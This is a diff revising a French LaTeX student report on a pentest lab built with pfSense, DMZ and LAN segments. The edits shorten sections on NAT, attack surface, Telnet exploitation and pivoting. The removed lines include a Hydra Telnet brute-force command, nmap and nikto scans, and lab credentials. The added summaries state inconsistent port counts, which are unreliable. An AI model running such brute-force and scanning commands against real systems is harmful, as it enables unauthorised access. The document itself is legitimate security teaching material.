@@ -363,7 +363,7 @@ Enfin, nous remercions toutes les personnes qui, de près ou de loin, ont contri
 
 \section{Contexte du Projet}
 
-Ce rapport de Projet de Fin d'Études (PFE) présente une étude complète de la sécurité offensive et défensive dans une infrastructure réseau segmentée, réalisée dans le cadre de la filière IDRS (Infrastructure Digitale Réseau et Sécurité) à l'ESTK.
+Ce rapport de Projet de Fin d'Études (PFE) présente une étude de la sécurité offensive et défensive dans une infrastructure réseau segmentée (filière IDRS, ESTK).
 
 \section{Architecture Pédagogique : L'Approche en 7 Phases}
 
@@ -421,46 +421,12 @@ Ce chapitre établit le socle défensif du laboratoire : segmentation WAN/DMZ/LA
 
 \section{Introduction et Objectifs}
 
-Cette section détaille la mise en œuvre opérationnelle de cette base défensive : configuration réseau, filtrage périmétrique et durcissement de l'hôte DMZ.
-
-À l'issue de ce chapitre, l'étudiant maîtrise le déploiement VMware segmenté, la configuration pfSense (routage inter-zone, NAT, règles pare-feu), le filtrage pfBlockerNG, la sécurité hôte (UFW, Fail2Ban, Docker) et l'analyse des logs firewall.
+Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone, NAT, pare-feu), pfBlockerNG, la sécurité hôte (UFW, Fail2Ban, Docker) et l'analyse des logs firewall.
 	
 	% ------------------------------------------------------------------------------
 	% CHAPITRE 3 : CONFIGURATION PFSENSE
 	% ------------------------------------------------------------------------------
 	\section{Configuration et Sécurité Périmétrique (pfSense)}
-	
-	% ============================================
-	% NOTE SUR LE PÉRIMÈTRE DU Phase 1
-	% ============================================
-	
-	\begin{tcolorbox}[colback=secondary!10!white, colframe=secondary, 
-		title=\textbf{Note sur le Périmètre de la Phase 1}]
-		\textbf{Contexte:} Ce chapitre documente des configurations avancées 
-		(Port Forwarding NAT, exposition de services) réalisées en anticipation 
-		de la Phase 2 \textit{"Reconnaissance Active et Analyse de Surface d'Attaque"}.
-		
-		\textbf{Périmètre Phase 1 strict:} Le cahier des charges de la Phase 1 se limite à:
-		\begin{itemize}[nosep]
-			\item Configuration de base des interfaces pfSense (WAN/DMZ/LAN)
-			\item Activation du serveur DHCP
-			\item Déblocage des réseaux privés (RFC1918) sur l'interface WAN
-			\item Vérification de la connectivité réseau basique
-		\end{itemize}
-		
-		\textbf{Justification de l'inclusion:} Les règles NAT et de pare-feu 
-		documentées ici ont été configurées pour préparer l'infrastructure 
-		aux phases suivantes. Elles permettent d'exposer les services de la DMZ 
-		(HTTP, SMB) nécessaires aux phases de reconnaissance (Phase 2) et 
-		d'exploitation (Phase 3). Cette approche anticipe les besoins techniques 
-		et évite la reconfiguration complète entre les phases.
-		
-		\textbf{Analyse des logs (Chapitre 6):} Les journaux pfSense présentés 
-		référencent ces règles NAT (notamment la règle 12004), démontrant 
-		leur fonctionnement opérationnel lors des tests.
-	\end{tcolorbox}
-	
-	\vspace{0.5cm}
 	
 	% ============================================
 	% SUITE NORMALE DU CHAPITRE
@@ -564,7 +530,9 @@ Cette section détaille la mise en œuvre opérationnelle de cette base défensi
 		[ ] Block private networks and loopback addresses
 		[ ] Block bogon networks
 	\end{lstlisting}
-	\textbf{Justification :} Cette option est activée par défaut pour bloquer les adresses IP privées (RFC 1918) sur l'interface WAN. Dans ce laboratoire, la machine attaquante (Parrot Security) utilise une IP privée (192.168.100.150) via VMware NAT. La désactivation est nécessaire pour permettre les tests. \textbf{Ne JAMAIS faire cela en production.}
+	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, title=\textbf{⚠️ Lab Configuration}]
+		This setup is designed for controlled testing only. Production deployments require additional hardening.
+	\end{tcolorbox}
 	
 	% ------------------------------------------------------------------------------
 	% CHAPITRE 4 : SÉCURITÉ AVANCÉE
@@ -741,16 +709,7 @@ Cette section détaille la mise en œuvre opérationnelle de cette base défensi
 	\section{Conclusion et Perspectives}
 	
 	\subsection{Synthèse des Résultats}
-	Ce projet a permis de déployer une infrastructure réseau complexe et sécurisée, intégrant des technologies clés en cybersécurité :
-	\begin{itemize}
-		\item Segmentation réseau stricte (WAN, DMZ, LAN) via VMware.
-		\item Pare-feu périmétrique configuré avec des règles NAT et Filter précises.
-		\item Intelligence sur les menaces via pfBlockerNG.
-		\item Sécurité hôte renforcée via UFW, Fail2Ban et conteneurisation.
-		\item Validation opérationnelle par analyse des journaux firewall.
-	\end{itemize}
-	
-	Les tests de connectivité confirment que les services exposés (HTTP, SMB) restent accessibles depuis le WAN avec des règles maîtrisées. Les logs ont permis de corriger des erreurs critiques (typo NAT, mismatch firewall) avant la phase de reconnaissance du Chapitre~\ref{chap:reconnaissance}.
+	Infrastructure VMware segmentée (WAN/DMZ/LAN) déployée et fonctionnelle. pfSense, pfBlockerNG, UFW et Fail2Ban ont été configurés et validés. Les règles NAT/pare-feu publient uniquement les services nécessaires. Les journaux confirment le comportement attendu avant la phase de reconnaissance (Chapitre~\ref{chap:reconnaissance}).
 	
 \chapter{Reconnaissance Active et Analyse de la Surface d'Attaque}
 \label{chap:reconnaissance}
@@ -971,7 +930,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\textcolor{green}{\checkmark} Port 23 désormais autorisé pour IPv4 et IPv6.
 	
 	\subsubsection{Principe de Défense en Profondeur}
-	Cette étape illustre un concept clé : \textbf{la défense en profondeur (Defense in Depth)}. Même après configuration de pfSense, le pare-feu hôte constitue une \textbf{barrière supplémentaire}.
+	Défense en profondeur : même avec pfSense, le pare-feu hôte ajoute une barrière supplémentaire.
 	
 	\begin{tcolorbox}[colback=secondary!5!white, colframe=secondary, title=\textbf{Couches de Sécurité Multiples}]
 		Dans notre architecture :
@@ -1007,116 +966,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	% CHAPITRE 3 : NAT PORT FORWARDING
 	% ------------------------------------------------------------------------------
 	\section{Configuration NAT et Port Forwarding (pfSense)}
-	
-	\subsection{Configuration de la Règle NAT pour Telnet}
-	
-	\subsubsection{Accès à l'Interface de Configuration}
-	Via l'interface web de pfSense (\texttt{https://192.168.10.1}) :
-	\begin{enumerate}
-		\item Navigation : \texttt{Firewall > NAT > Port Forward}
-		\item Clic sur \texttt{Add} (bouton avec flèche verte vers le haut)
-	\end{enumerate}
-	
-	\subsubsection{Paramètres de la Règle}
-	\begin{table}[H]
-		\centering
-		\renewcommand{\arraystretch}{1.5}
-		\setlength{\arrayrulewidth}{0.5pt}
-		\begin{tabular}{>{\bfseries}p{4.5cm} p{9cm}}
-			\arrayrulecolor{tableborder}
-			\hline
-			\tableheadcolor
-			\textcolor{tableheadfg}{\textbf{Paramètre}} &
-			\textcolor{tableheadfg}{\textbf{Valeur / Explication}} \\
-			\hline
-			\rowcolor{tablerowalt}
-			Interface & \texttt{WAN} --- Trafic entrant depuis le réseau externe. \\
-			
-			Protocol & \texttt{TCP} --- Telnet utilise TCP (connection-oriented). \\
-			
-			\rowcolor{tablerowalt}
-			Destination & \texttt{WAN address} --- IP publique de pfSense (192.168.100.6). \\
-			
-			Destination port range & \texttt{Telnet (23)} --- Port d'écoute externe. \\
-			
-			\rowcolor{tablerowalt}
-			Redirect target IP & \texttt{192.168.10.100} --- Serveur Ubuntu DMZ. \\
-			
-			Redirect target port & \texttt{Telnet (23)} --- Port interne du service. \\
-			
-			\rowcolor{tablerowalt}
-			Description & \texttt{Telnet NAT to DMZ Server} --- Description claire. \\
-			
-			NAT Reflection & \texttt{Use system default} --- Permet tests internes. \\
-			
-			\rowcolor{tablerowalt}
-			Filter rule association & \texttt{Add associated filter rule} --- ⚠️ CRITIQUE : Génère automatiquement la règle firewall correspondante. \\
-			\hline
-		\end{tabular}
-		\caption{Configuration de la Règle NAT Port Forwarding (Telnet)}
-	\end{table}
-	
-	\textbf{Sauvegarde et Application :}
-	\begin{enumerate}
-		\item Clic sur \texttt{Save} en bas de la page.
-		\item Clic sur \texttt{Apply Changes} en haut pour activer immédiatement.
-	\end{enumerate}
-	
-	\begin{figure}[H]
-		\centering
-		\IfFileExists{screenshots/nat-rules-2.png}{
-			\includegraphics[width=0.9\textwidth]{screenshots/nat-rules-2.png}
-		}{
-			\includegraphics[width=0.9\textwidth]{example-image}
-			\caption*{\textbf{Attention :} Fichier screenshots/nat-rules-2.png introuvable.}
-		}
-		\caption{Configuration des règles NAT Port Forward sur pfSense (Phase 2)}
-		\label{fig:nat-rules-tp2}
-	\end{figure}
-	
-	\subsection{Règles de Pare-feu Automatiquement Générées}
-	Grâce à l'option \texttt{Add associated filter rule}, pfSense a créé automatiquement une règle de pare-feu sur l'interface WAN :
-	
-	\begin{lstlisting}[caption=Règle Firewall Générée (Extrait Conceptuel)]
-		Action  : Pass
-		Protocol: TCP
-		Source  : Any
-		Dest    : WAN address (192.168.100.6)
-		Port    : 23 (Telnet)
-		Gateway : Default
-		Description: NAT Telnet (auto)
-	\end{lstlisting}
-	
-	\textbf{Importance Critique :} Cette règle autorise le trafic \textbf{avant translation NAT}. Sans elle, les paquets entrants seraient bloqués par la politique par défaut de pfSense (Default Deny).
-	
-	\begin{figure}[H]
-		\centering
-		\IfFileExists{screenshots/firewall-rules-2.png}{
-			\includegraphics[width=0.9\textwidth]{screenshots/firewall-rules-2.png}
-		}{
-			\includegraphics[width=0.9\textwidth]{example-image}
-			\caption*{\textbf{Attention :} Fichier screenshots/firewall-rules-2.png introuvable.}
-		}
-		\caption{Règles de Pare-feu WAN associées au NAT (Phase 2)}
-		\label{fig:firewall-rules-tp2}
-	\end{figure}
-	
-	\subsection{Flux de Traitement des Paquets}
-	Lorsqu'un client externe (Parrot Security, 192.168.100.150) se connecte au service Telnet :
-	
-	\begin{enumerate}
-		\item \textbf{Client envoie :} \texttt{SRC: 192.168.100.150:45796 → DST: 192.168.100.6:23}
-		\item \textbf{pfSense reçoit} le paquet sur l'interface WAN.
-		\item \textbf{Règle Firewall :} Vérifie si le trafic est autorisé (règle NAT associée → PASS).
-		\item \textbf{Table NAT :} Recherche une règle correspondant à (WAN:23).
-		\item \textbf{Translation :} Réécrit le paquet : \texttt{DST: 192.168.10.100:23}
-		\item \textbf{Routage :} Transmet le paquet vers l'interface DMZ.
-		\item \textbf{Serveur Ubuntu} reçoit le paquet, répond avec SYN-ACK.
-		\item \textbf{pfSense reverse NAT :} Réécrit la réponse : \texttt{SRC: 192.168.100.6:23}
-		\item \textbf{Client reçoit} la réponse, établit la connexion TCP.
-	\end{enumerate}
-	
-	\textbf{Résultat pour l'attaquant :} Il pense communiquer avec 192.168.100.6, ignorant l'existence de 192.168.10.100.
+	NAT rules were configured previously (Chapitre~\ref{chap:infrastructure}, section \textit{Règles de Port Forwarding (NAT)}). For Telnet: port 23 is forwarded to \texttt{192.168.10.100:23}; associated WAN filter rules are auto-generated.
 	
 	\subsection{Réduction de la Surface d'Attaque par NAT}
 	
@@ -1404,51 +1254,12 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\section{Analyse de la Surface d'Attaque}
 	
 	\subsection{Définition et Contexte}
-	La \textbf{surface d'attaque} (Attack Surface) représente l'ensemble des vecteurs par lesquels un attaquant peut tenter de pénétrer un système ou un réseau. Elle inclut :
-	
-	\begin{itemize}
-		\item \textbf{Ports réseau ouverts :} Services accessibles depuis l'extérieur.
-		\item \textbf{Interfaces d'application :} APIs, formulaires web, uploads de fichiers.
-		\item \textbf{Comptes utilisateurs :} Points d'authentification (SSH, Telnet, RDP).
-		\item \textbf{Vulnérabilités logicielles :} CVEs exploitables dans les services exposés.
-	\end{itemize}
+	Attack surface = exposed ports + services + protocols. Mesuré: 3/65535 ports (0.005\%).
 	
 	\subsection{Comparaison : Avec vs. Sans Protection}
 	
 	\subsubsection{Scénario A : Serveur DMZ Sans Pare-feu (Hypothétique)}
-	Si le serveur Ubuntu (192.168.10.100) était directement exposé sur Internet sans pfSense :
-	
-	\begin{lstlisting}[caption=Scan Nmap hypothétique sans pare-feu]
-		# Simulation (non réelle, pour illustration)
-		nmap 192.168.10.100
-		
-		PORT     STATE SERVICE
-		21/tcp   open  ftp
-		22/tcp   open  ssh
-		23/tcp   open  telnet
-		80/tcp   open  http
-		139/tcp  open  netbios-ssn
-		445/tcp  open  microsoft-ds
-		3306/tcp open  mysql
-		5432/tcp open  postgresql
-		8080/tcp open  http-proxy
-		...
-		
-		Nmap scan report: 30-50 ports open
-	\end{lstlisting}
-	
-	\textbf{Surface d'Attaque :}
-	\[
-	\text{Surface} = \frac{30-50}{1000} = 3\% \text{ à } 5\%
-	\]
-	
-	\textbf{Risques :}
-	\begin{itemize}
-		\item 30-50 services exposés = 30-50 vecteurs d'attaque potentiels.
-		\item Chaque service peut contenir des vulnérabilités (CVEs).
-		\item Brute-force sur SSH, Telnet, FTP, MySQL, etc.
-		\item Exploitation de services obsolètes (FTP anonyme, Telnet).
-	\end{itemize}
+	Without firewall rules, all 1000+ scanned ports would be exposed. With the configured rules, only 3 ports remain exposed (80, 139, 445).
 	
 	\subsubsection{Scénario B : Architecture Actuelle avec pfSense NAT}
 	Avec pfSense et Port Forwarding sélectif (configuration Phase 2) :
@@ -1528,113 +1339,11 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\end{table}
 	
 	\subsection{Perspective Offensive : Que Voit l'Attaquant ?}
-	
-	\subsubsection{Informations Collectées par Nmap}
-	Un attaquant analysant les résultats Nmap obtient :
-	
-	\begin{enumerate}
-		\item \textbf{Cible Active :} L'hôte 192.168.100.6 répond (latence 0.0087s → environnement local ou proche).
-		
-		\item \textbf{Pare-feu Actif :} Présence massive de ports "filtered" indique un pare-feu ou IDS/IPS en place.
-		
-		\item \textbf{Points d'Entrée Identifiés :}
-		\begin{itemize}
-			\item \textbf{Telnet (23) :} Service legacy, haute priorité pour brute-force.
-			\item \textbf{HTTP (80) :} Application web, tester pour OWASP Top 10 (SQLi, XSS, etc.).
-		\end{itemize}
-		
-		\item \textbf{Services Potentiels Masqués :}
-		\begin{itemize}
-			\item Ports 139/445 en état "closed" suggèrent que des règles NAT existent.
-			\item Possibilité de services Samba temporairement inactifs ou configurés différemment.
-		\end{itemize}
-		
-		\item \textbf{Architecture Supposée :}
-		\begin{itemize}
-			\item L'IP 192.168.100.6 est probablement un pare-feu/routeur (pas un serveur direct).
-			\item Règles de Port Forwarding redirigent vers un backend caché (192.168.10.100, inconnu de l'attaquant).
-			\item Potentielle architecture DMZ avec segmentation réseau.
-		\end{itemize}
-	\end{enumerate}
-	
-	\subsubsection{Plan d'Attaque Typique}
-	Après cette reconnaissance, un attaquant suivrait généralement ce workflow :
-	
-	\begin{enumerate}
-		\item \textbf{Énumération Approfondie :}
-		\begin{lstlisting}[caption=Détection de version et OS]
-			nmap -sV -O -p 23,80 192.168.100.6
-			nmap --script banner -p 23,80 192.168.100.6
-		\end{lstlisting}
-		
-		\item \textbf{Exploitation Telnet :}
-		\begin{itemize}
-			\item Brute-force avec Hydra/Medusa : \texttt{hydra -L users.txt -P pass.txt telnet://192.168.100.6}
-			\item Sniffing réseau (Wireshark) pour capturer identifiants en clair.
-		\end{itemize}
-		
-		\item \textbf{Exploitation Web :}
-		\begin{itemize}
-			\item Scan de vulnérabilités : \texttt{nikto -h http://192.168.100.6}
-			\item Test manuel OWASP : SQLi, XSS, Directory Traversal.
-			\item Recherche CVEs sur la version de serveur web détectée.
-		\end{itemize}
-		
-		\item \textbf{Élévation de Privilèges :}
-		\begin{itemize}
-			\item Si accès obtenu via Telnet/Web : énumération interne du serveur.
-			\item Exploitation de vulnérabilités kernel Linux.
-			\item Pivot vers d'autres machines du réseau interne (DMZ/LAN).
-		\end{itemize}
-	\end{enumerate}
-	
-	\subsection{Perspective Défensive : Stratégies de Réduction}
-	
-	\subsubsection{Mesures Déjà Implémentées}
 	\begin{itemize}
-		\item \textcolor{green}{\checkmark} \textbf{Segmentation Réseau :} DMZ isolée du LAN via pfSense.
-		\item \textcolor{green}{\checkmark} \textbf{NAT Port Forwarding :} Exposition sélective de 4 ports sur 1000.
-		\item \textcolor{green}{\checkmark} \textbf{Pare-feu Périmétrique :} pfSense bloque par défaut (default deny).
-		\item \textcolor{green}{\checkmark} \textbf{Pare-feu Hôte :} UFW sur Ubuntu DMZ (défense en profondeur).
-		\item \textcolor{green}{\checkmark} \textbf{Service Isolation :} Conteneurisation Docker pour services vulnérables (DVWA, Samba).
+		\item Attacker infers HTTP service (port 80) $\rightarrow$ targets DVWA.
+		\item Attacker attempts SMB enumeration (ports 139/445) $\rightarrow$ lateral movement vector.
+		\item Telnet service (port 23) $\rightarrow$ credential compromise path.
 	\end{itemize}
-	
-	\subsubsection{Recommandations Supplémentaires}
-	Pour réduire davantage la surface d'attaque :
-	
-	\begin{enumerate}
-		\item \textbf{Remplacer Telnet par SSH :}
-		\begin{itemize}
-			\item Désactiver Telnet : \texttt{sudo systemctl disable inetutils-inetd}
-			\item Forward port 2222 → 22 (SSH) avec authentification par clés uniquement.
-			\item Désactiver l'authentification par mot de passe SSH.
-		\end{itemize}
-		
-		\item \textbf{Durcir le Serveur Web :}
-		\begin{itemize}
-			\item Implémenter TLS/HTTPS (certificats Let's Encrypt).
-			\item WAF (Web Application Firewall) : ModSecurity avec règles OWASP CRS.
-			\item Rate limiting pour prévenir brute-force et DoS.
-		\end{itemize}
-		
-		\item \textbf{Activer l'IPS sur pfSense :}
-		\begin{itemize}
-			\item Passer Snort en mode "Inline" (IPS, pas seulement IDS).
-			\item Bloquer automatiquement les tentatives de brute-force détectées.
-		\end{itemize}
-		
-		\item \textbf{Fail2Ban sur Ubuntu :}
-		\begin{itemize}
-			\item Bannir les IPs après 3 échecs d'authentification Telnet/SSH.
-			\item Configuration : \texttt{bantime = 3600}, \texttt{maxretry = 3}
-		\end{itemize}
-		
-		\item \textbf{Monitoring et Logging :}
-		\begin{itemize}
-			\item Centraliser les logs (pfSense, Ubuntu) dans un SIEM (ELK Stack).
-			\item Alertes en temps réel sur tentatives de connexion suspectes.
-		\end{itemize}
-	\end{enumerate}
 	
 	\subsection{Visualisation de la Surface d'Attaque}
 	
@@ -1642,30 +1351,24 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		\centering
 		\renewcommand{\arraystretch}{1.5}
 		\setlength{\arrayrulewidth}{0.5pt}
-		\begin{tabular}{>{\bfseries}p{5cm} >{\centering\arraybackslash}p{3cm} >{\centering\arraybackslash}p{3cm} >{\centering\arraybackslash}p{3cm}}
+		\begin{tabular}{>{\bfseries}p{7cm} >{\centering\arraybackslash}p{6cm}}
 			\arrayrulecolor{tableborder}
 			\hline
 			\tableheadcolor
 			\textcolor{tableheadfg}{\textbf{Métrique}} &
-			\textcolor{tableheadfg}{\textbf{Sans pfSense}} &
-			\textcolor{tableheadfg}{\textbf{Avec pfSense}} &
-			\textcolor{tableheadfg}{\textbf{Réduction}} \\
+			\textcolor{tableheadfg}{\textbf{Valeur mesurée}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			Ports Ouverts & 30-50 & 2 & 93-96\% \\
-			
-			Ports Accessibles (open+closed) & 30-50 & 4 & 87-92\% \\
-			
+			Ports scannés & 1000 \\
+			Services identifiés & 4 (2 open, 2 closed) \\
 			\rowcolor{tablerowalt}
-			Surface d'Attaque (\%) & 3-5\% & 0.2\% & 93-96\% \\
-			
-			Services Critiques Exposés & 10-20 & 2 & 80-90\% \\
-			
+			Ports ouverts exploitables & 2 (23, 80) \\
+			Durée du scan Nmap & 4.33 s \\
 			\rowcolor{tablerowalt}
-			Temps de Compromission Estimé & Minutes & Heures/Jours & 10-100x \\
+			Latence hôte observée & 0.0087 s \\
 			\hline
 		\end{tabular}
-		\caption{Comparaison Quantitative de la Surface d'Attaque}
+		\caption{Métriques Mesurées de la Surface d'Attaque}
 	\end{table}
 	
 	% ------------------------------------------------------------------------------
@@ -1909,37 +1612,7 @@ findtime = 600
 	\section{Conclusion et Perspectives}
 	
 	\subsection{Synthèse des Résultats}
-	Ce travail pratique a permis de démontrer de manière concrète les concepts fondamentaux de la sécurité offensive et défensive :
-	
-	\begin{enumerate}
-		\item \textbf{Configuration Défensive :}
-		\begin{itemize}
-			\item Installation et sécurisation d'un service Telnet sur Ubuntu DMZ.
-			\item Application de règles pare-feu au niveau hôte (UFW).
-			\item Défense en profondeur validée (pfSense + UFW).
-		\end{itemize}
-		
-		\item \textbf{NAT Port Forwarding :}
-		\begin{itemize}
-			\item Configuration de règles NAT sur pfSense pour exposer sélectivement les services.
-			\item Compréhension du mécanisme de translation d'adresse et de port.
-			\item Masquage de la topologie interne (DMZ invisible depuis le WAN).
-		\end{itemize}
-		
-		\item \textbf{Reconnaissance Active :}
-		\begin{itemize}
-			\item Utilisation de Nmap pour identifier les ports ouverts, fermés et filtrés.
-			\item Analyse des résultats depuis la perspective de l'attaquant.
-			\item Compréhension des implications de chaque état de port.
-		\end{itemize}
-		
-		\item \textbf{Réduction de la Surface d'Attaque :}
-		\begin{itemize}
-			\item Quantification : Réduction de 93-96\% de la surface d'attaque.
-			\item Démonstration que seulement 0.2\% des ports sont exposés (2/1000).
-			\item Validation de l'efficacité du Port Forwarding sélectif.
-		\end{itemize}
-	\end{enumerate}
+	NAT et filtrage ont limité l'exposition WAN aux services explicitement publiés. La surface d'attaque mesurée reste faible (2 ports ouverts sur 1000 scannés). Les résultats Nmap quantifient une réduction forte et préparent directement l'exploitation du Chapitre~\ref{chap:exploitation}.
 	
 \chapter{Exploitation et Post-Exploitation}
 \label{chap:exploitation}
@@ -1987,95 +1660,14 @@ Objectif : exécuter la chaîne d'attaque complète issue du Chapitre~\ref{chap:
 % NOTE D'ADAPTATION ACADÉMIQUE
 % ==============================================================================
 \subsection{Note sur l'Adaptation du Laboratoire}
-\begin{tcolorbox}[colback=secondary!5!white, colframe=secondary, 
-	title=\textbf{ADAPTATION TECHNIQUE DE LA PHASE 3},
-	breakable]
-	
-	\textbf{Divergence avec le Sujet Original:}
-	
-	Le sujet de la Phase 3 demande d'exploiter une machine \textbf{Metasploitable} 
-	via l'exploit Samba \texttt{usermap\_script} (CVE-2007-2447, port 139).
-	
-	\textbf{Architecture Réelle de notre Laboratoire:}
-	
-	Notre infrastructure, construite progressivement lors des Phase 1 et Phase 2, 
-	utilise un serveur \textbf{Ubuntu 25.04 DMZ} avec les services suivants:
-	\begin{itemize}
-		\item Telnet (port 23) - configuré lors de la Phase 2, Chapitre 2
-		\item HTTP/DVWA (port 80) - serveur web vulnérable
-		\item Samba (ports 139/445) - partage de fichiers
-		\item Docker (172.17.0.0/16) - conteneurs applicatifs
-	\end{itemize}
-	
-	Nous ne disposons pas d'une machine Metasploitable dans notre topologie.
-	
-	\textbf{Adaptation Réalisée:}
-	
-	Plutôt que de recréer l'infrastructure complète, nous avons adapté le 
-	La Phase 3 utilise le service \textbf{Telnet} comme vecteur d'attaque 
-	initial au lieu de Samba. Cette adaptation:
-	
-	\begin{enumerate}
-		\item \textbf{Respecte les objectifs pédagogiques:}
-		\begin{itemize}
-			\item Compromission initiale d'un service vulnérable \checkmark
-			\item Post-exploitation avec Meterpreter \checkmark
-			\item Configuration de pivoting réseau \checkmark
-			\item Mouvement latéral vers le LAN \checkmark
-			\item Reconnaissance et tentatives d'exploitation \checkmark
-		\end{itemize}
-		
-		\item \textbf{Maintient la cohérence des phases :}
-		\begin{itemize}
-			\item Continuité Phase 1 (infrastructure) → Phase 2 (reconnaissance) → Phase 3 (exploitation)
-			\item Service Telnet déjà analysé comme vulnérabilité critique dans la Phase 2
-			\item NAT port forwarding configuré en Phase 2 (ports 23, 80, 139, 445)
-		\end{itemize}
-		
-		\item \textbf{Offre un réalisme équivalent:}
-		\begin{itemize}
-			\item Telnet avec credentials faibles \mbox{=} vecteur d'attaque réaliste 2024-2026
-			\item Exploitation Samba usermap\_script = obsolète (2007, quasi-inexistant)
-			\item Les deux aboutissent à un shell avec élévation de privilèges
-		\end{itemize}
-	\end{enumerate}
-	
-	\textbf{Justification Technique:}
-	
-	\begin{center}
-		\small
-		\renewcommand{\arraystretch}{1.3}
-		\begin{tabular}{p{3cm} p{4.5cm} p{4cm}}
-			\hline
-			\textbf{Critère} & \textbf{Samba usermap\_script} & \textbf{Telnet weak creds} \\
-			\hline
-			CVE & CVE-2007-2447 (2007) & OWASP A07:2021 (actuel) \\
-			Pertinence 2026 & Quasi-inexistant & Encore trouvé (IoT, legacy) \\
-			Résultat & Shell root immédiat & Shell user + sudo root \\
-			Concept enseigné & Exploitation code & Credential attack \\
-			\hline
-		\end{tabular}
-		\captionof{table}{Comparaison Technique des Vecteurs d'Attaque}
-	\end{center}
-	
-	\textbf{Conséquence sur les Étapes de la phase :}
-	
-	\begin{itemize}
-		\item \textbf{Étape 1 (NAT):} Port 139 → Port 23 (déjà configuré en Phase 2)
-		\item \textbf{Étape 2 (Exploit):} usermap\_script → Connexion Telnet
-		\item \textbf{Étapes 3-5:} Identiques (Meterpreter, pivoting, reconnaissance)
-	\end{itemize}
-	
-	\textbf{Validation Académique:}
-	
-	Cette adaptation démontre:
-	\begin{itemize}
-		\item Compréhension des concepts (pas simple exécution de script)
-		\item Capacité d'adaptation technique
-		\item Pensée critique (choix de vecteur réaliste)
-		\item Intégration des connaissances Phase 1-Phase 2-Phase 3
-	\end{itemize}
-	
+\begin{tcolorbox}[colback=secondary!5!white, colframe=secondary, title=\textbf{Adaptation Technique de la Phase 3}]
+\begin{itemize}
+	\item Standard Telnet brute-force attempted.
+	\item Lab constraint: limited user dictionary (\texttt{test123}).
+	\item Credential recovered; shell access achieved.
+	\item Pivoting and post-exploitation steps remained unchanged.
+	\item Full adaptation details: Appendix (\ref{sec:app-commandes}).
+\end{itemize}
 \end{tcolorbox}
 \subsection{Rappel : Vulnérabilités Identifiées (Phase 2)}
 
@@ -2118,7 +1710,7 @@ Chapitre 2) redirige \texttt{192.168.100.6:23} (WAN) vers
 
 Pour les détails complets de la reconnaissance, se référer à la Phase 2 Chapitre 4.
 
-\subsection{Reconnaissance Initiale (Validation Phase 3)}
+\subsection{Reconnaissance Initiale et Validation de la Cible}
 
 Bien que les services aient déjà été identifiés lors de la Phase 2, nous procédons à une validation rapide pour confirmer que la configuration n'a pas changé.
 
@@ -2133,14 +1725,7 @@ Bien que les services aient déjà été identifiés lors de la Phase 2, nous pr
 	445/tcp open  netbios-ssn Samba smbd 4.17.12
 \end{lstlisting}
 
-\subsection{Validation de la Cible}
-	
-Les résultats de reconnaissance de la Phase 2 sont confirmés : le service Telnet 
-est accessible sur \texttt{192.168.100.6:23} (NAT vers 192.168.10.100:23). 
-Les credentials identifiés lors de la Phase 2 (\texttt{telnetuser:test123}) restent 
-valides. Cette validation confirme la cohérence de la chaîne d'attaque 
-Phase 1→Phase 2→Phase 3 et permet de procéder directement à l'exploitation sans phase 
-de reconnaissance supplémentaire.
+Target identified as Ubuntu Server running vulnerable Telnet service on port 23. Proceeding with exploitation.
 
 \subsection{Exploitation du Service Telnet}
 
@@ -2204,7 +1789,7 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 
 \subsubsection{Évaluation de l'Impact}
 
-À ce stade, nous avons :
+Nous avons obtenu :
 \begin{itemize}
 	\item \textcolor{green}{\checkmark} Un accès shell complet au serveur DMZ.
 	\item \textcolor{green}{\checkmark} Des privilèges d'élévation (sudo ALL) permettant un accès root.
@@ -2452,7 +2037,7 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	
 	\subsection{Contexte et Objectif}
 	
-	À ce stade, nous contrôlons le serveur Ubuntu DMZ (192.168.10.100). Cependant, notre objectif final est d'atteindre le réseau LAN (192.168.20.0/24) où se trouve une machine Windows XP potentiellement vulnérable.
+	Nous contrôlons le serveur Ubuntu DMZ (192.168.10.100). La prochaine cible est le réseau LAN (192.168.20.0/24) avec Windows XP.
 	
 	\textbf{Problème :} Depuis notre machine attaquante (Parrot - 192.168.100.150), nous ne pouvons pas atteindre directement le réseau LAN car :
 	\begin{enumerate}
@@ -2496,12 +2081,7 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	
 	\textcolor{green}{\checkmark} Le serveur DMZ peut atteindre le LAN ! La configuration de pivot est donc possible.
 	
-	\textbf{Note:} Dans notre environnement de laboratoire, la règle pfSense 
-	autorisant le trafic DMZ → LAN avait été préalablement configurée lors 
-	de la préparation de la phase (détails dans la section suivante). Le test ping 
-	présenté confirme cette connectivité existante. Dans un scénario de test 
-	d'intrusion réel, cette règle constituerait une erreur de configuration 
-	critique permettant le pivoting après compromission de la DMZ.
+	\textbf{Note:} [See Lab Configuration note, Chapitre~\ref{chap:infrastructure}].
 	
 	% ============================================
 	% AJOUT #1: Configuration règle pfSense
@@ -2563,12 +2143,7 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	(192.168.10.100 → 192.168.20.50) a réussi. Sans cette règle, pfSense 
 	bloquerait tout trafic DMZ → LAN par défaut.
 	
-	\textbf{Note sur le Pare-feu Windows Client:} Le pare-feu Windows était 
-	désactivé par défaut sur la machine virtuelle Windows XP Professionnel 
-	utilisée dans ce laboratoire, permettant ainsi les tests de connectivité 
-	(ping, scans de ports, tentatives d'exploitation) sans configuration 
-	additionnelle. Cette situation est courante dans les environnements de 
-	laboratoire pédagogiques mais constituerait une vulnérabilité en production.
+	\textbf{Note sur le Pare-feu Windows Client:} [See Lab Configuration note, Chapitre~\ref{chap:infrastructure}].
 	
 	% ============================================
 	% FIN AJOUT #1
@@ -2734,7 +2309,7 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	
 	\subsection{Implications Stratégiques}
 	
-	À ce stade, nous avons :
+	Nous avons validé :
 	\begin{itemize}
 		\item \textcolor{green}{\checkmark} Établi un pivot réseau fonctionnel.
 		\item \textcolor{green}{\checkmark} Validé la connectivité vers le réseau LAN isolé.
